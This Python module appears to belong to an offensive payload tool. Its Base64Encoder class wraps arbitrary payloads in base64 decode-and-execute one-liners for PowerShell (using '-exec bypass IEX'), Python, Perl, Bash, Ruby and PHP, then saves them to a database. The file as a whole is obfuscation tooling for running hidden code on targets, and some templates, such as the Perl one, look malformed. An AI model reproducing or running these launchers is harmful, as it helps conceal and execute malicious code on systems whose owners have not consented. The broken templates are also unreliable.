import base64

from lib.database import insert_payload
from lib.settings import UnacceptableExecType


class Base64Encoder(object):

    """
    encode a payload into base64
    """

    payload_starts = {
        "powershell": (
                    'Powershell.exe -exec bypass IEX '
                    '[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("{}"))'
                ),
        "python": "python -c 'exec(\"{}\".decode(\"base64\"))'",
        "perl": "perl -MMIME::Base64::decode_base64 -e 'eval print decode_base64 join\"\",<>' {}",
        "bash": "STRING=$(echo \"{}\" | base64 --decode);eval $STRING",
        "ruby": "ruby -e \"require \\\"base64\\\";eval(Base64.decode64(\\\"{}\\\"))\"",
        "php": "php -r 'exec(base64_decode(\"{}\"));'"
    }

    def __init__(self, payload_data, cursor):
        self.payload = payload_data["data"]["payload"]
        self.exec_type = payload_data["data"]["information"]["exec"]
        self.payload_type = payload_data["data"]["information"]["type"]
        self.cursor = cursor

    def encode(self):
        encoded_payload = base64.b64encode(self.payload)
        acceptable_exec_types = ("powershell", "php", "python", "perl", "ruby", "bash")
        if self.exec_type.lower() in acceptable_exec_types:
            payload = self.payload_starts[self.exec_type]
        else:
            payload = ""
        if payload == "":
            raise UnacceptableExecType("{} is not able to be encoded into Base64".format(self.exec_type))

        retval = payload.format(encoded_payload)
        is_inserted = insert_payload(retval, self.payload_type, self.exec_type, self.cursor)
        return retval, is_inserted
